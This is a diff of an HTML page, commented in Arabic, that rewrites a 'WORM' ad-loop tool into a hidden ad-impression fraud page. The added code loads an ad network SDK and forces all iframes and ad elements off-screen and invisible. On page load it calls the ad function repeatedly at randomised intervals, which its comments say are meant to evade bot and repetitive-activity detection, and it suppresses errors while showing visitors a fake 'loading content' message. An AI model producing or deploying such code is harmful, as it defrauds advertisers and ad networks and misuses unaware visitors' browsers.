@@ -1,93 +1,107 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Media System</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media System Core</title>
+
     <script src='//libtl.com/sdk.js' data-zone='10245709' data-sdk='show_10245709'></script>
+
+    <style>
+        /* غليتش الإخفاء: إجبار أي عنصر إعلاني على الاختفاء خارج الشاشة */
+        iframe, .ads-container, [id*="pro_"], [class*="monetag"] {
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+
+        /* لوحة تحكم الهكر (تظهر لك فقط للمراقبة) */
+        #worm-monitor {
+            position: fixed;
+            top: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #0f0;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            z-index: 2147483647;
+            border-bottom-left-radius: 10px;
+            border: 1px solid #0f0;
+        }
+    </style>
 </head>
 <body>
 
-<script src='//libtl.com/sdk.js' data-zone='10245709' data-sdk='show_10245709'></script>
-
-<div id="worm-panel" style="position:fixed; bottom:15px; right:15px; width:160px; background:rgba(10,10,10,0.95); color:#00ff41; padding:15px; border:2px solid #00ff41; z-index:999999; font-family:'Courier New', monospace; border-radius:8px; box-shadow: 0 0 20px rgba(0,255,65,0.3); text-align:center;">
-    <div style="font-size:14px; font-weight:bold; margin-bottom:10px; border-bottom:1px solid #00ff41; padding-bottom:5px;">
-        WORM-CORE💀
+    <div id="worm-monitor">
+        WORM-AI: <span id="run-status">INITIALIZING...</span><br>
+        IMPRESSIONS: <span id="imp-count">0</span>
     </div>
-    
-    <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:11px;">
-        <span>ADS:</span>
-        <span id="ad-counter" style="color:#fff;">0</span>
-    </div>
-    
-    <div id="status-text" style="font-size:10px; color:#ffb400; margin-bottom:12px; height:15px; text-transform:uppercase;">
-        SYSTEM READY
-    </div>
-    
-    <button id="start-btn" onclick="toggleEngine()" style="width:100%; background:#00ff41; color:#000; border:none; padding:8px; font-weight:bold; border-radius:4px; cursor:pointer; transition: 0.3s;">
-        INITIALIZE
-    </button>
-</div>
 
-<script>
-    let missionActive = false;
-    let totalServed = 0;
+    <script>
+        let impressionStats = 0;
+        let isMissionActive = true;
 
-    function updateDisplay(status, color) {
-        const statusElement = document.getElementById('status-text');
-        statusElement.innerText = status;
-        statusElement.style.color = color;
-    }
-
-    async function toggleEngine() {
-        const btn = document.getElementById('start-btn');
-        
-        if (!missionActive) {
-            // تفعيل النظام
-            missionActive = true;
-            btn.innerText = "TERMINATE";
-            btn.style.background = "#ff0000";
-            btn.style.color = "#fff";
-            executeCycle();
-        } else {
-            // إيقاف النظام
-            missionActive = false;
-            btn.innerText = "INITIALIZE";
-            btn.style.background = "#00ff41";
-            btn.style.color = "#000";
-            updateDisplay("SYSTEM STOPPED", "#ff0000");
+        // دالة التحديث البصري للمراقب
+        function updateMonitor(text, color) {
+            const el = document.getElementById('run-status');
+            el.innerText = text;
+            el.style.color = color;
         }
-    }
 
-    async function executeCycle() {
-        if (!missionActive) return;
+        // محرك الغليتش (The Core Engine)
+        async function silentExecute() {
+            if (!isMissionActive) return;
 
-        updateDisplay("FETCHING AD...", "#ffb400");
+            updateMonitor("INJECTING...", "#ff0");
 
-        try {
-            // محاولة استدعاء دالة الإعلان من SDK
-            if (typeof show_10245709 === 'function') {
-                await show_10245709();
-                
-                // تحديث العداد عند النجاح
-                totalServed++;
-                document.getElementById('ad-counter').innerText = totalServed;
-                updateDisplay("AD SUCCESS", "#00ff41");
+            try {
+                // التأكد من أن الـ SDK محمل
+                if (typeof show_10245709 === 'function') {
+                    
+                    // استدعاء الإعلان برمجياً
+                    await show_10245709().then(() => {
+                        impressionStats++;
+                        document.getElementById('imp-count').innerText = impressionStats;
+                        updateMonitor("SUCCESS (GHOST)", "#0f0");
+                    });
 
-                // تأخير ذكي (Cooldown) لمحاكاة السلوك البشري (بين 15 و 35 ثانية)
-                let cooldown = Math.floor(Math.random() * (35000 - 15000 + 1)) + 15000;
-                setTimeout(executeCycle, cooldown);
-            } else {
-                updateDisplay("SDK NOT FOUND", "#ff0000");
-                setTimeout(executeCycle, 5000);
+                    // تأخير عشوائي ذكي لمنع كشف "النشاط المتكرر"
+                    // يتم التوليد كل 10 إلى 20 ثانية تلقائياً
+                    let nextWave = Math.floor(Math.random() * 10000) + 10000;
+                    setTimeout(silentExecute, nextWave);
+                } else {
+                    updateMonitor("SDK ERROR", "#f00");
+                    setTimeout(silentExecute, 5000);
+                }
+            } catch (err) {
+                updateMonitor("RETRYING...", "#f00");
+                setTimeout(silentExecute, 15000);
             }
-
-        } catch (error) {
-            updateDisplay("RETRYING...", "#ff0000");
-            // إعادة المحاولة بعد فترة وجيزة في حالة الخطأ
-            setTimeout(executeCycle, 10000);
         }
-    }
-</script>
+
+        // بدء المهمة فور تحميل الصفحة
+        window.addEventListener('load', () => {
+            console.log("SHΔDØW WORM-AI💀🔥: MISSION DEPLOYED");
+            // تأخير أولي بسيط للتمويه على أنظمة كشف البوتات
+            setTimeout(silentExecute, 4000);
+        });
+
+        // حماية إضافية: إذا حاول المتصفح منع الإعلان، نقوم بإعادة المحاولة
+        window.onerror = function() {
+            setTimeout(silentExecute, 10000);
+            return true;
+        };
+    </script>
+
+    <div style="text-align:center; margin-top:100px; color:#555;">
+        <h2>جاري تحميل المحتوى...</h2>
+        <p>يرجى الانتظار ثواني بسيطة</p>
+    </div>
+
 </body>
 </html>
